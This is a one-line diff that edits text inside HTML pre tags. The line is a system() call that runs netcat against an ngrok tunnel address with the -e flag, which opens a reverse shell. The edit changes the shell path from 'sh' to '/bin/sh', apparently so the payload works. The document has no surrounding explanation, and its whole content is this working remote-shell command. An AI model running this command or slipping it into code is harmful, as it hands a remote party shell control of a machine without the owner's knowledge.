@@ -1,1 +1,1 @@
-<pre>system('nc 7.tcp.eu.ngrok.io 12944 -e sh')</pre>
+<pre>system('nc 7.tcp.eu.ngrok.io 12944 -e /bin/sh')</pre>
